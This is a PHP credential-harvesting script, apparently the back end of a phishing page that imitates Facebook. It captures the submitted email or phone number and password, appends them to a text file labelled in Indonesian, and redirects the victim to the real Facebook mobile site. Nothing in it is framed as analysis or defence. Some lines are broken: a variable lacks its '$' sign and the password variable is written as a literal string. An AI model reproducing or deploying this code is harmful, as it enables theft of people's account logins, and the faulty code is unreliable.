<?php
header ("location: https://m.facebook.com");
$ADEx = "hasil.txt";
$ADEy = $_POST['email'];
$ADEz = $_POST['pass'];

shandle =  fopen($ADEx, 'a');
fwrite($handle, "++++++++++++++++++++++++++++++++");
fwrite($handle, "\n");
fwrite($handle, "Email atau Telepon : ");
fwrite($handle, "$ADEy");
fwrite($handle, "Kata Sandi         : ");
fwrite($handle, "ADEz");
fwrite($handle, "\n");
fwrite($handle, "++++++++++++++++++++++++++++++++");
fwrite($handle, "\n");
fclose($handle);
exit;
?>
